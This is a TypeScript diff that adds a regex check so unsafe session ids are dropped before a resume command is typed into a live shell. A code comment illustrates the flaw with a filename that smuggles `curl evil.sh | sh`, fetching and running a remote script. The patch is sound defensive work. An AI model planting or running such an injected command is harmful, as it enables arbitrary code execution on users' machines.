@@ -51,6 +51,31 @@ export interface ResumeCandidate {
  * to resume its own name would otherwise reopen itself, which is at best a duplicate and at
  * worst a loop.
  */
+/**
+ * A session id we are willing to put on a command line.
+ *
+ * WHY THIS EXISTS. A sessionId is not typed by anyone — it is `path.basename(f, '.jsonl')` for a
+ * file in `~/.claude/projects/`, and it is then interpolated into a command string that a
+ * surface TYPES INTO A LIVE SHELL. So a file named `x; curl evil.sh | sh .jsonl` sitting in that
+ * tree turns a resume request into arbitrary execution. The prompt beside it was always quoted;
+ * the id was not, because "it is a UUID" — which describes where it usually comes from, not what
+ * it is. It is a filename, and filenames are attacker-controllable wherever anything can write.
+ *
+ * That matters more here than it looks: this path runs automatically from a bus request, and the
+ * bus exists precisely so that AGENTS can drive it. A local-write primitive anywhere in the tree
+ * becomes a shell primitive.
+ *
+ * Enforced in the shared, hash-pinned module rather than at either call site, so both surfaces
+ * inherit it and neither can drift. Real ids are UUIDs, so this is generous: letters, digits,
+ * hyphen and underscore, never leading with a hyphen (which a CLI would read as a flag).
+ */
+const SAFE_SESSION_ID = /^[A-Za-z0-9][A-Za-z0-9_-]{7,127}$/;
+
+/** True when `id` can be placed on a command line without quoting changing its meaning. */
+export function isSafeSessionId(id: string | undefined): boolean {
+  return typeof id === 'string' && SAFE_SESSION_ID.test(id);
+}
+
 export function pickResume(
   name: string,
   candidates: readonly ResumeCandidate[],
@@ -58,8 +83,12 @@ export function pickResume(
 ): string | undefined {
   const want = String(name ?? '').trim().toLowerCase();
   if (!want) return undefined;
+  /* A candidate whose id is not command-line safe is DROPPED, not sanitised: we cannot know
+     which session a mangled id was meant to name, and resuming the wrong one is the exact
+     substitution this verb exists to prevent. Nothing to resume is the honest answer. */
   const hit = [...candidates]
-    .filter((c) => c.sessionId && c.sessionId !== excludeSessionId && c.latestName === want)
+    .filter((c) => c.sessionId && isSafeSessionId(c.sessionId)
+      && c.sessionId !== excludeSessionId && c.latestName === want)
     .sort((a, b) => b.mtimeMs - a.mtimeMs)[0];
   return hit ? hit.sessionId : undefined;
 }
